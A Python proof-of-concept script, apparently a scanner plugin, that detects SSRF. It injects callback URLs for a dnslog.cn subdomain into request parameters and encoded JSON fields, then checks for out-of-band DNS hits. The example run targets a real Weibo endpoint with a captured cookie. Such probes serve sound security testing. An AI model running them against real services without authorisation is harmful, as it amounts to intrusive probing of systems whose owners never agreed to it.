#coding: utf-8
import requests
import json, base64, urllib.parse
import random
import urllib3
import logging

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class dnslog(object):
    def __init__(self):
        self.subdomain_url = 'http://dnslog.cn/getdomain.php?t=0.24411870217658538'
        self.cookies = {'PHPSESSID':''}
        self.verify_url = 'http://dnslog.cn/getrecords.php?t=0.4137965633035243'
        self.subdomain = ''

        self.getsubdomain()

    def getsubdomain(self):
        try:
            r = requests.get(self.subdomain_url, timeout=10)
            self.subdomain = '.'+r.text
            self.cookies.update({'PHPSESSID': r.cookies.get('PHPSESSID')})
        except Exception as e:
            print('dnslog '+str(e))

    def verify(self, data):
        try:
            r = requests.get(self.verify_url, timeout=10, cookies=self.cookies)
            if r.json():
                return True
            return False
        except Exception as e:
            print('dnslog '+str(e))
            return False

class Poc(object):
    def __init__(self):
        self.dnslog = dnslog()
        self.pockey = str(random.randint(11, 99))

    def verify(self, data):
        self.detectSSRF = False
        url = data.get('url')
        url = urllib.parse.urlparse(url)
        host = url.netloc.split(':')[0]
        host = host.replace('.', '_')
        self.pockey = host+self.pockey

        self.walkjson(data.get('data'))
        self.walkjson(data.get('params'))

        if self.detectSSRF:
            logging.info('==detect ssrf '+data['url'].split('?')[0])
            self.sendreq(data)
            times = 0
            while True:
                # 重试5次防止超时的异常
                try:
                    times += 1
                    if times > 5:
                        break
                    if self.dnslog.verify(self.pockey):
                        print("{} 存在ssrf漏洞".format(data.get('url').split('?')[0]))
                        return [{
                            "title": "{} 存在ssrf漏洞".format(data.get('url').split('?')[0]),
                            "desc":  "检查服务端发出的网络请求，是否存在前端可控url",
                            "request": data,
                            "severity": "high",
                        }]
                    else:
                        break
                except:
                    pass
                
    
    def walkjson(self, d):
        if isinstance(d, list):
            t = enumerate(d)
        elif isinstance(d, dict):
            t = d.items()
        for k, v in t:
            if isinstance(v, str):
                special = False
                if v.startswith('eyJ'):
                    try:
                        #base64json
                        vv = base64.b64decode(v)
                        vv = json.loads(vv)
                        special = True
                    except:
                        vv = {}
                        special = False
                    for _k,_v in vv.items():
                        #插入payload
                        if self.detecthttp(_v):
                            vv[_k] = 'http://'+ self.pockey+self.dnslog.subdomain
                            self.detectSSRF = True
                        elif self.detectpath(_v):
                            #host+path
                            vv[_k] = '@'+self.pockey+self.dnslog.subdomain+v
                            self.detectSSRF = True
                    if special:
                        d[k] = base64.b64encode(json.dumps(vv).encode()).decode()

                if not special and (v.startswith('%7B') or v.startswith('{')):
                    #json
                    vv = urllib.parse.unquote(v)
                    try:
                        vv = json.loads(vv)
                        special = True
                    except:
                        vv = {}
                        special = False
                    for _k,_v in vv.items():
                        #插入payload
                        if self.detecthttp(_v):
                            vv[_k] = 'http://'+ self.pockey+self.dnslog.subdomain
                            self.detectSSRF = True
                        elif self.detectpath(_v):
                            #host+path
                            vv[_k] = '@'+self.pockey+self.dnslog.subdomain+v
                            self.detectSSRF = True
                    if special:
                        d[k] = urllib.parse.quote(json.dumps(vv))
                if not special:
                    #插入payload
                    if self.detecthttp(v):
                        d[k] = 'http://'+ self.pockey+self.dnslog.subdomain
                        self.detectSSRF = True
                    elif self.detectpath(v):
                        #host+path
                        d[k] = '@'+self.pockey+self.dnslog.subdomain+v
                        self.detectSSRF = True
                
            elif isinstance(v, list) or isinstance(v, dict):
                self.walkjson(v)

    def sendreq(self, data, allow_redirects=False):
        j = {}
        proxies = {}
        #proxies = { "http": "socks5://127.0.0.1:10800", "https": "socks5://127.0.0.1:10800", }
        #proxies = {"http": "http://127.0.0.1:8882", "https": "http://127.0.0.1:8882"}
        j['proxies'] = proxies
        j['url'] = data.get('url').split('?')[0]
        j['method'] = data.get('method')
        j['cookies'] = data.get('cookies')
        #默认会urlencode
        j['params'] = data.get('params')

        j['headers'] = data.get('headers')
        #http2.0
        if ':authority' in  j['headers'].keys():
            j['headers']['authority'] =  j['headers'][':authority']
            j['headers'].pop(':authority')
        #
        typess = data.get('type')
        if typess == 'json':
            j['json'] = data.get('data')
        elif typess == 'multipart':
            j['files'] = data.get('data')
        else:
            j['data'] = data.get('data')

        j['verify'] = False
        j['timeout'] = 10
        j['allow_redirects'] = allow_redirects

        return requests.request(**j)

    def detecthttp(self, url):
        if not isinstance(url, str):
            return False
        v = url.lower()
        if v.startswith(('http%3a%2f%2f', 'https%3a%2f%2f', 'http://', 'https://', 'http%253a%252f%252f', 'https%253a%252f%252f')):
            return True

    def detectpath(self, url):
        if not isinstance(url, str):
            return False
        v = url.lower()
        if v.startswith(('/', '%2f', '%252f')):
            return True


if __name__ == '__main__':
    data = {"url": "https://widget.weibo.com/topics/topic_vote_base.php", "data": {"uid": "1709486153", "border": "0", "footbar": "1", "width": "821", "height": "559", "refer": "1", "filter": "0", "language": "zh_cn", "version": "eyJhIjoiaHR0cDovLyJ9", "dup": "0", "antispam": "0", "isOutTopicSearch": "0", "top_mblog": "H8gs8beQy", "isshowright": "1", "tag": "360%E6%8A%A2%E7%A5%A8%E7%8E%8B7%E4%BB%A3%2C%E5%BF%AB%E6%8A%A2%E7%A5%A8%E5%BF%AB%E5%9B%9E%E5%AE%B6%2C%E8%81%8A%E8%81%8A%E4%BD%A0%E7%9A%84%E6%98%A5%E8%BF%90%E6%95%85%E4%BA%8B", "og": "http%3A%2F%2F12306.360.cn%2F%3Ffrom%3Dweibo", "app_src": "5E3UYb", "r": "1566802460646"}, "method": "post", "cookies": {"YF-Widget-G0": "4a4609df0e4ef6187a7b4717d4e6cf12"}, "headers": {"host": "widget.weibo.com", "user-agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0", "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "accept-language": "en-US,en;q=0.5", "accept-encoding": "gzip, deflate, br", "referer": "http://12306.360.cn/", "connection": "keep-alive", "upgrade-insecure-requests": "1"}, "type": "form", "params": {}}

    print(Poc().verify(data))